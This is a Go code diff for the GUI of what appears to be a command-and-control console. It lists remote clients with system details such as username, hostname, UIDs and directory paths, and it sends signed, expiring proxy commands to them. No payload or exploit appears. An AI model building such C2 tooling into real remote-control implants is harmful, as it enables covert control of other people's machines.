@@ -4,15 +4,16 @@ import (
 	"crypto/ed25519"
 	"crypto/rand"
 	"example.com/itsuMain/lib/message"
-	"example.com/itsuMain/lib/util"
+	"example.com/itsuMain/lib/packet"
 	"fmt"
 	g "github.com/AllenDang/giu"
 	"log"
-	"math"
 	"os"
-	"sort"
-	"strings"
 	"time"
+)
+
+const (
+	fontSize = 12
 )
 
 var (
@@ -20,152 +21,32 @@ var (
 	state      = NewState()
 
 	//ui state
+
 	selectedID = uint64(0)
 
-	CondRTCPU        int32
-	CondRTCPUCond    int32
-	CondGOOS         string
-	CondGOOSEq       bool
-	CondCPUIDCPU     int32
-	CondCPUIDCPUCond int32
-	CondAddr         string
-	CondAddrEq       bool
+	CondRTCPU    int32
+	CondCPUIDCPU int32
+	CondGOOS     int32
+	CondAddr     int32
+
+	proxyConditions message.ProxyCondition
+	toProxy         message.Msg
+
+	//command stuff
+	CmdDuration int32 = 5
+
+	CmdArgsEchoMessage  string
+	CmdArgsPanicMessage string
 )
 
-func getClientsRows() []*g.TableRowWidget {
-	type intermediate struct {
-		id       uint64
-		lastSeen int
-		sysInfo  util.SystemInformation
-		addr     string
+func issueCommand(msg message.Msg) {
+	if _, err := state.session.WriteMessageED25519(&message.ProxyRequest{
+		IssuedOn:  time.Now().UnixMilli(),
+		ExpiresOn: time.Now().UnixMilli() + int64(CmdDuration)*1000,
+		Packet:    packet.NewPacket(message.SerializeMessage(msg)),
+	}, privateKey); err != nil {
+		log.Panicln(err)
 	}
-
-	intermediates := make([]intermediate, len(state.serverClientsLastSeen))
-
-	state.serverClientsMutex.Lock()
-
-	i := 0
-	for k, v := range state.serverClientsLastSeen {
-		intermediates[i].id = k
-		intermediates[i].lastSeen = (int)(math.Trunc(time.Now().Sub(v).Seconds()))
-		intermediates[i].sysInfo = state.serverClients[k].SysInfo
-		intermediates[i].addr = state.serverClients[k].Address
-		i++
-	}
-
-	state.serverClientsMutex.Unlock()
-
-	sort.Slice(intermediates, func(i, j int) bool { return intermediates[i].id < intermediates[j].id })
-
-	rows := make([]*g.TableRowWidget, len(intermediates))
-
-	for k, v := range intermediates {
-		idCopy := v.id
-		rows[k] = g.TableRow(
-			g.SmallButton(" ").OnClick(func() {
-				selectedID = idCopy
-			}),
-			g.Label(fmt.Sprint(v.id)),
-			g.Label(v.addr),
-			g.Label(fmt.Sprint(v.lastSeen)),
-		)
-	}
-
-	return rows
-}
-
-func loop() {
-	info := message.ClientInformation{}
-
-	if selectedID != 0 {
-		state.serverClientsMutex.RLock()
-		var ok bool
-		if info, ok = state.serverClients[selectedID]; !ok {
-			selectedID = 0
-			info = message.ClientInformation{}
-		}
-		state.serverClientsMutex.RUnlock()
-	}
-
-	infoRows := make([]*g.TableRowWidget, 0)
-
-	Append := func(label string, vs ...interface{}) {
-		infoRows = append(infoRows, g.TableRow(g.Label(label), g.Label(fmt.Sprint(vs...))))
-	}
-
-	brandStr := info.SysInfo.ProcBranding
-	if idx := strings.Index(brandStr, "\000"); idx != -1 {
-		brandStr = brandStr[:idx]
-	}
-
-	Append("Runtime processors", info.SysInfo.GONumCPU)
-	Append("CPUID processors", info.SysInfo.ProcMaxID)
-	Append("CPU Model", brandStr)
-
-	Append("User",
-		info.SysInfo.Username, "@", info.SysInfo.Hostname, ", ",
-		info.SysInfo.UID, ":", info.SysInfo.GID, " (", info.SysInfo.EUID, ":", info.SysInfo.EGID, ")")
-	Append("Home directory", info.SysInfo.HomeDir)
-	Append("Config directory", info.SysInfo.ConfigDir)
-	Append("Cache directory", info.SysInfo.CacheDir)
-	Append("Working directory", info.SysInfo.WorkingDir)
-	Append("Executable path", info.SysInfo.ExecPath)
-
-	infoTable := g.Table().
-		FastMode(true).
-		Columns(
-			g.TableColumn("Field"),
-			g.TableColumn("Value")).
-		Rows(infoRows...)
-
-	g.SingleWindow().Layout(
-		g.SplitLayout(g.DirectionHorizontal, true, 320,
-			g.Layout{
-				g.Table().
-					Columns(
-						g.TableColumn("Sel").Flags(g.TableColumnFlagsWidthStretch).InnerWidthOrWeight(15),
-						g.TableColumn("ID").Flags(g.TableColumnFlagsWidthStretch).InnerWidthOrWeight(110),
-						g.TableColumn("Address").Flags(g.TableColumnFlagsWidthStretch).InnerWidthOrWeight(80),
-						g.TableColumn("Secs").Flags(g.TableColumnFlagsWidthStretch).InnerWidthOrWeight(25),
-					).
-					Freeze(0, 1).
-					//FastMode(true).
-					Rows(getClientsRows()...),
-			},
-			g.Layout{
-				g.SplitLayout(g.DirectionVertical, true, 300, g.Layout{
-					g.Row(
-						g.Label("Information Pane"),
-						g.Label("|"),
-						g.Label(fmt.Sprint("Selected ID: ", selectedID))),
-					infoTable,
-				}, g.Layout{
-					g.Label("C&C"),
-					g.SplitLayout(g.DirectionHorizontal, true, 300,
-						g.Layout{
-							g.Label("Proxy conditions"),
-							g.Row(
-								g.Label("Go runtime processor cores"),
-								g.InputInt(&CondRTCPU).Size(32.),
-								g.InputInt(&CondRTCPUCond).Size(32.)),
-							g.Row(
-								g.Label("CPUID processor cores"),
-								g.InputInt(&CondCPUIDCPU).Size(32.),
-								g.InputInt(&CondCPUIDCPUCond).Size(32.)),
-							g.Row(
-								g.Label("GOOS"),
-								g.InputText(&CondGOOS).Size(32.),
-								g.Checkbox("", &CondGOOSEq)),
-							g.Row(
-								g.Label("Address"),
-								g.InputText(&CondAddr),
-								g.Checkbox("", &CondAddrEq)),
-						},
-						g.Layout{
-							g.Label("Message to proxy"),
-						}),
-				}),
-			}))
 }
 
 func main() {
@@ -202,7 +83,7 @@ func main() {
 		log.Panicln(err)
 	}
 
-	window := g.NewMasterWindow("Hello world", 1280, 720, 0)
-	g.SetDefaultFont("FiraCode-Medium", 12)
+	window := g.NewMasterWindow(fmt.Sprint("Given ID: ", state.id), 1280, 720, g.MasterWindowFlagsNotResizable)
+	g.SetDefaultFont("FiraCode-Medium", fontSize)
 	window.Run(loop)
 }
